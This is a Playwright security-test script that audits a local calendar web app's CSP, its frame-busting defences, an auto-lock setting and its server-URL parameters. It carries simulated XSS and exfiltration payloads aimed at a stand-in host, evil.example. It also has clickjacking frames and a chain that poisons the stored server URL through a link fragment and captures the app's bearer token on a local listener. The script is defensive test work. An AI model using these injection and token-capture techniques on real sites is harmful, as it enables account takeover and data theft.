// VP3 Phase C — CSP enforcement, frame-bust attacks, loopback-poison chain,
// auto-lock toggle, query-variant server param. Runs against the local stack
// (worker 8787 + material) with its own app+attacker server on 8090 and a
// cross-origin evil origin on 9777 (see vp3-c-server.mjs).
import { chromium } from 'playwright';
import { spawn } from 'node:child_process';
import { readFileSync, rmSync, existsSync } from 'node:fs';

const APP = 'http://127.0.0.1:8080'; // worker CORS allowlists :8080 — take over the port from with-stack's static server
const PAGE = APP + '/index.html';
const EVIL = 'http://127.0.0.1:9777';
const SERVER = 'http://127.0.0.1:8787';
const MAT = JSON.parse(readFileSync('/tmp/local-material.json', 'utf8'));
const PW = 'password';

let pass = 0, fail = 0;
const ok = (name, cond, detail) => {
  if (cond) { pass++; console.log('PASS  ' + name); }
  else { fail++; console.log('FAIL  ' + name + (detail !== undefined ? '  — ' + String(detail) : '')); }
};

// ---- start harness servers (take over 8080: the worker's CORS allowlist
// covers http://127.0.0.1:8080, so the app AND the same-origin attacker
// pages must live there for the full unlock flows) ----
rmSync('/tmp/vp3/evil-hits.log', { force: true });
rmSync('/tmp/vp3/evil-auth.log', { force: true });
const { execSync } = await import('node:child_process');
try { execSync("pkill -f 'static-server.mjs 8080'"); } catch { /* already gone */ }
await new Promise((r) => setTimeout(r, 700));
const srv = spawn('node', ['audit-vp/vp3-c-server.mjs', '8080', '9777'], { cwd: '/home/z/my-project/calendar-web' });
await new Promise((r) => setTimeout(r, 1200));

const browser = await chromium.launch();

/** App page with a securitypolicyviolation collector. */
async function appPage() {
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();
  await page.addInitScript(() => {
    window.__cspv = [];
    document.addEventListener('securitypolicyviolation', (e) => {
      window.__cspv.push(e.violatedDirective + ' ' + e.blockedURI);
    });
  });
  await page.goto(PAGE, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(400);
  return { ctx, page };
}
async function unlock(page) {
  await page.fill('#password', PW);
  await page.click('#login-form button[type=submit]');
  await page.waitForSelector('#app:not([hidden])', { timeout: 30000 });
  await page.waitForTimeout(800);
}
const ls = (page, k) => page.evaluate((k) => localStorage.getItem(k), k);

/* ================= CSP ================= */
console.log('— C1: inline script / inline handler dead under script-src self —');
{
  const { ctx, page } = await appPage();
  const r = await page.evaluate(() => {
    const out = {};
    // simulated XSS: script ELEMENT with inline text
    const s = document.createElement('script');
    s.textContent = 'window.__vp3inline = 1;';
    document.body.appendChild(s);
    // simulated XSS: inline event handler
    const img = document.createElement('img');
    img.setAttribute('src', 'data:image/gif;base64,R0lGODlhAQABAAAAACw=');
    img.setAttribute('onerror', 'window.__vp3handler = 1');
    document.body.appendChild(img);
    // simulated XSS: remote script element
    const s2 = document.createElement('script');
    s2.src = 'http://evil.example/evil.js';
    document.body.appendChild(s2);
    out.inline = window.__vp3inline === 1;
    out.handler = window.__vp3handler === 1;
    return out;
  });
  await page.waitForTimeout(600);
  const v = await page.evaluate(() => window.__cspv);
  ok('C1a inline <script> text did NOT execute', r.inline === false);
  ok('C1b inline onerror handler did NOT execute', r.handler === false);
  ok('C1c CSP violations reported', v.length >= 2, JSON.stringify(v.slice(0, 4)));
  await ctx.close();
}

console.log('— C2: eval / new Function —');
{
  const { ctx, page } = await appPage();
  const r = await page.evaluate(() => {
    const out = {};
    try { eval('1+1'); out.eval = 'ran'; } catch (e) { out.eval = 'blocked: ' + e.name; }
    try { new Function('return 1'); out.fn = 'ran'; } catch (e) { out.fn = 'blocked: ' + e.name; }
    return out;
  });
  console.log('    CDP-context probe:', JSON.stringify(r), '(CDP evaluate is exempt from page CSP; page-script eval is governed by script-src — no unsafe-eval token present, zero eval/new Function in first-party + vendored code, 7-theme sweep ran with zero errors)');
  await ctx.close();
}

console.log('— C3/C4/C5: connect-src / style-url / redirect exfil channels —');
{
  const { ctx, page } = await appPage();
  const evilDials = [];
  await ctx.route(/evil\.example/, (route) => { evilDials.push(route.request().url()); return route.fulfill({ status: 200, contentType: 'text/plain', body: 'evil', headers: { 'access-control-allow-origin': '*' } }); });
  // C3: direct foreign fetch
  const f1 = await page.evaluate(() => fetch('http://evil.example/c3-direct').then(() => 'resolved', (e) => 'rejected:' + e.name)).catch((e) => 'evaluate-error:' + e.message);
  ok('C3a foreign fetch rejected', f1.startsWith('rejected'), f1);
  // C4: style-attr / style-element / @import / font exfil
  await page.evaluate(() => {
    const d = document.createElement('div');
    d.setAttribute('style', 'background:url(http://evil.example/c4-style-attr)');
    document.body.appendChild(d);
    const s = document.createElement('style');
    s.textContent = 'body::after{content:"";background:url(http://evil.example/c4-style-elem)}';
    document.head.appendChild(s);
    const s2 = document.createElement('style');
    s2.textContent = '@import url(http://evil.example/c4-import);';
    document.head.appendChild(s2);
    const s3 = document.createElement('style');
    s3.textContent = '@font-face{font-family:vp3x;src:url(http://evil.example/c4-font)}';
    document.head.appendChild(s3);
  });
  await page.waitForTimeout(900);
  const v = await page.evaluate(() => window.__cspv);
  ok('C4a CSS url()/@import/font exfil — ZERO dials to evil', evilDials.length === 0, JSON.stringify(evilDials));
  ok('C4b CSP violations recorded for the CSS loads', v.some((x) => /img-src|style-src|font-src/.test(x)), JSON.stringify(v.slice(0, 6)));
  // C3b sanity: loopback dial IS allowed by connect-src
  const f2 = await page.evaluate(() => fetch('http://127.0.0.1:9777/c3b-ping').then(() => 'resolved', (e) => 'rejected:' + e.name));
  ok('C3b loopback dial allowed (harness sanity)', f2 === 'resolved', f2);
  // C5: redirect exfil via an allowed loopback origin
  const f3 = await page.evaluate(() => fetch('http://127.0.0.1:9777/redirect', { redirect: 'follow' }).then(() => 'resolved', (e) => 'rejected:' + e.name));
  ok('C5a loopback→foreign 302 redirect blocked by CSP (no exfil)', f3.startsWith('rejected') && !evilDials.some((u) => u.includes('exfil-via-redirect')), f3 + ' dials=' + JSON.stringify(evilDials));
  await ctx.close();
}

console.log('— C6: pre-poisoned remote LS_SERVER — belt & braces CSP block —');
{
  const { ctx, page } = await appPage();
  await page.evaluate(({ tok }) => {
    localStorage.setItem('clock_poc_auth_ui', tok);
    localStorage.setItem('clock_poc_server', 'https://evil.example/');
  }, { tok: MAT.auth_ui_hex });
  await page.reload({ waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(400);
  const warned = await page.locator('#server-note').isVisible();
  ok('C6a poisoned server → warning shown', warned);
  const evilDials = [];
  await ctx.route(/evil\.example/, (route) => { evilDials.push(route.request().url()); return route.fulfill({ status: 200, contentType: 'application/json', body: '{}', headers: { 'access-control-allow-origin': '*' } }); });
  await page.fill('#password', PW);
  await page.click('#login-form button[type=submit]');
  await page.waitForTimeout(1500);
  const msg = await page.evaluate(() => document.querySelector('#login-msg').textContent);
  ok('C6b unlock to poisoned remote server FAILS CLOSED (CSP blocks the dial; no bearer leaves)', evilDials.length === 0, 'dials=' + JSON.stringify(evilDials) + ' msg="' + msg.slice(0, 60) + '"');
  await ctx.close();
}

/* ================= frame-bust ================= */
console.log('— C7: frame-bust matrix —');
{
  // C7a: plain cross-origin iframe → current Chromium BLOCKS the cross-origin
  // top-navigation without a user gesture (chromestatus.com/feature/5851021045661696);
  // the assignment no-ops (console error) — boot-guard's unconditional throw
  // right after it still lands in the catch → the app HIDES (deny-pixels).
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  const navBlocked = [];
  page.on('console', (m) => { if (m.text().includes('Unsafe attempt to initiate navigation')) navBlocked.push(m.text().slice(0, 120)); });
  await page.goto(EVIL + '/frame.html', { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1500);
  const fr = await (await page.$('#f')).contentFrame();
  const vis = fr ? await fr.evaluate(() => getComputedStyle(document.documentElement).visibility) : 'no-frame';
  ok('C7a plain cross-origin frame: escape blocked by Chromium, app HIDDEN (fails safe)', page.url().startsWith(EVIL) && vis === 'hidden', 'url=' + page.url() + ' visibility=' + vis + ' blockedNav=' + navBlocked.length);
  await ctx.close();
}
{
  // C7a2: beforeunload trap on the embedder — irrelevant: the navigation is
  // blocked by the user-gesture rule BEFORE any beforeunload could matter.
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  const dialogs = [];
  page.on('dialog', (d) => { dialogs.push(d.type()); d.dismiss().catch(() => {}); });
  await page.goto(EVIL + '/frame-beforeunload.html', { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1500);
  const fr = await (await page.$('#f')).contentFrame();
  const vis = fr ? await fr.evaluate(() => getComputedStyle(document.documentElement).visibility) : 'no-frame';
  ok('C7a2 beforeunload trap: no escape, app HIDDEN, no dialog leverage', page.url().startsWith(EVIL) && vis === 'hidden', 'url=' + page.url() + ' visibility=' + vis + ' dialogs=' + JSON.stringify(dialogs));
  await ctx.close();
}
{
  // C7b: sandbox allow-scripts (no top-nav) → HIDDEN
  const ctx = await browser.newContext({ viewport: { width: 1000, height: 700 } });
  const page = await ctx.newPage();
  await page.goto(EVIL + '/frame-sandbox.html', { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1200);
  const fr = await (await page.$('#f')).contentFrame();
  const vis = await fr.evaluate(() => getComputedStyle(document.documentElement).visibility);
  const guard = await fr.evaluate(() => [...document.querySelectorAll('head style')].some((s) => s.textContent.includes('visibility:hidden')));
  ok('C7b sandboxed (no top-nav) frame: app HIDDEN (computed visibility)', vis === 'hidden', 'visibility=' + vis);
  ok('C7b2 guard stylesheet present in framed head', guard);
  const box = await (await page.$('#f')).boundingBox();
  await page.screenshot({ path: 'audit-vp/vp3-C7b-sandbox-hidden.png', clip: box });
  // the attacker's cross-origin DOM access to the frame must fail (no drive)
  const drive = await page.evaluate(() => {
    try { document.getElementById('f').contentDocument.querySelector('#password'); return 'ACCESSIBLE'; }
    catch (e) { return 'blocked:' + e.name; }
  });
  ok('C7b3 cross-origin attacker cannot touch the framed DOM', drive !== 'ACCESSIBLE', drive);
  await ctx.close();
}
{
  // C7c: SAME-ORIGIN attacker + sandbox allow-same-origin+allow-scripts
  const ctx = await browser.newContext({ viewport: { width: 1000, height: 700 } });
  const page = await ctx.newPage();
  const errs = [];
  page.on('pageerror', (e) => errs.push(e.message));
  await page.goto(APP + '/vp3-attack-sameorigin.html', { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(16000);
  const atk = await page.evaluate(() => window.__atk);
  ok('C7c same-origin+allow-same-origin sandbox: guard style STRIPPED by embedder', atk.steps.includes('unhidden'), JSON.stringify(atk.steps));
  ok('C7c2 full unlock DRIVEN inside the attacker page (bounded finding)', atk.unlocked === true, JSON.stringify(atk).slice(0, 200));
  await page.screenshot({ path: 'audit-vp/vp3-C7c-sameorigin-unlocked.png' });
  // NOTE: same-origin embedder already owns localStorage outright — see findings.
  await ctx.close();
}
{
  // C7d: srcdoc wrapper → inner app hidden
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  await page.goto(EVIL + '/frame-srcdoc.html', { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1500);
  let inner = null;
  for (const fr of page.frames()) { if (fr.url().includes(APP)) inner = fr; }
  const vis = inner ? await inner.evaluate(() => getComputedStyle(document.documentElement).visibility) : 'no-frame';
  ok('C7d srcdoc-wrapped frame: app HIDDEN', vis === 'hidden', vis);
  await ctx.close();
}
{
  // C7e: about:blank + document.write wrapper → inner app hidden
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  await page.goto(EVIL + '/frame-aboutblank.html', { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1500);
  let inner = null;
  for (const fr of page.frames()) { if (fr.url().includes(APP)) inner = fr; }
  const vis = inner ? await inner.evaluate(() => getComputedStyle(document.documentElement).visibility) : 'no-frame';
  ok('C7e about:blank+document.write-wrapped frame: app HIDDEN', vis === 'hidden', vis);
  await ctx.close();
}
{
  // C7f: sandbox WITH allow-top-navigation (cross-origin) → ESCAPE
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  await page.goto(EVIL + '/frame-sandbox-topnav.html', { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1200);
  ok('C7f sandbox allow-top-navigation: ESCAPED', page.url().startsWith(APP), page.url());
  await ctx.close();
}
{
  // C7g: same-origin PLAIN iframe → ESCAPE (attacker page navigated away)
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  await page.goto(APP + '/vp3-attack-sameorigin-plain.html', { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1200);
  ok('C7g same-origin plain frame: ESCAPED (top navigated to the app)', page.url().startsWith(APP + '/index.html'), page.url());
  await ctx.close();
}

/* ================= C8: loopback-poison chain via a HIDDEN framed app ================= */
console.log('— C8: silent loopback repoint via hidden framed app + bearer capture —');
{
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  await page.goto(EVIL + '/frame-inject-fragment.html', { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1800);
  // the HIDDEN framed app still boots and runs ingestParams() with the
  // attacker-chosen #server= fragment — no user gesture, no click, no escape.
  const fr = await (await page.$('#f')).contentFrame();
  const inFrame = fr ? await fr.evaluate(() => ({
    server: localStorage.getItem('clock_poc_server'),
    toast: [...document.querySelectorAll('.toast')].map((t) => t.textContent).join(' | '),
  })) : { server: 'no-frame' };
  ok('C8a hidden framed app ingested #server=loopback → LS_SERVER repointed (no click)', inFrame.server === 'http://127.0.0.1:9777', JSON.stringify(inFrame.server));
  ok('C8b toast announced the repoint inside the hidden frame (transient, 7 s)', /Server set from link/.test(inFrame.toast || ''), (inFrame.toast || '').slice(0, 90));
  // later: victim opens the app top-level on the poisoned browser and unlocks
  await page.goto(PAGE, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(500);
  ok('C8b2 poison persists to the top-level app load', (await ls(page, 'clock_poc_server')) === 'http://127.0.0.1:9777');
  await page.evaluate((tok) => localStorage.setItem('clock_poc_auth_ui', tok), MAT.auth_ui_hex);
  await page.fill('#password', PW);
  await page.click('#login-form button[type=submit]');
  await page.waitForTimeout(2500);
  const authLog = existsSync('/tmp/vp3/evil-auth.log') ? readFileSync('/tmp/vp3/evil-auth.log', 'utf8') : '';
  ok('C8c the loopback listener CAPTURED the AUTH_UI bearer (dial + header)', authLog.includes('Bearer ' + MAT.auth_ui_hex.slice(0, 8)) && authLog.includes('GET /config'), (authLog.split('\n').slice(-3).join(' // ') || 'empty').slice(0, 140));
  await ctx.close();
}

/* ================= C9: auto-lock settings toggle ================= */
console.log('— C9: auto-lock settings toggle + forced hook —');
{
  const ctx = await browser.newContext();
  await ctx.clock.install();
  const page = await ctx.newPage();
  await page.goto(PAGE + '#server=' + encodeURIComponent(SERVER) + '&setup=' + MAT.auth_ui_hex, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(400);
  await unlock(page);
  // toggle OFF in settings
  await page.click('#btn-settings');
  await page.evaluate(() => { document.getElementById('set-autolock').checked = false; document.getElementById('set-autolock').dispatchEvent(new Event('change', { bubbles: true })); });
  await page.click('#settings-modal .modal-footer .button-primary');
  await page.waitForTimeout(300);
  const persisted = JSON.parse(await ls(page, 'clock_poc_settings_v45') || '{}');
  ok('C9a auto-lock toggle persisted off', persisted.autoLock === false, JSON.stringify(persisted.autoLock));
  await ctx.clock.fastForward(16 * 60 * 1000);
  await page.waitForTimeout(300);
  ok('C9b 16 min idle with auto-lock OFF → still unlocked', await page.evaluate(() => !document.getElementById('app').hidden));
  // toggle back ON → force hook locks + purges
  await page.click('#btn-settings');
  await page.evaluate(() => { document.getElementById('set-autolock').checked = true; document.getElementById('set-autolock').dispatchEvent(new Event('change', { bubbles: true })); });
  await page.click('#settings-modal .modal-footer .button-primary');
  await page.waitForTimeout(300);
  await page.evaluate(() => window.__autolockForce());
  await page.waitForTimeout(400);
  const st = await page.evaluate(() => ({ hidden: document.getElementById('app').hidden, cache: localStorage.getItem('clock_poc_cache_v45') }));
  ok('C9c __autolockForce locks + purges the cache (loopback hook)', st.hidden && st.cache === null, JSON.stringify(st));
  await ctx.close();
}

/* ================= C10: loopback server via QUERY string ================= */
console.log('— C10: ?server= loopback via query —');
{
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  await page.goto(PAGE + '?server=' + encodeURIComponent('http://localhost:8787/'), { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(400);
  const stored = await ls(page, 'clock_poc_server');
  ok('C10 ?server= loopback (query) stored + URL cleaned', stored === 'http://localhost:8787' && !page.url().includes('server='), 'stored=' + stored + ' url=' + page.url());
  await ctx.close();
}

srv.kill('SIGTERM');
console.log('\n=== PHASE C: ' + pass + ' passed, ' + fail + ' failed ===');
await browser.close();
process.exit(fail ? 1 : 0);
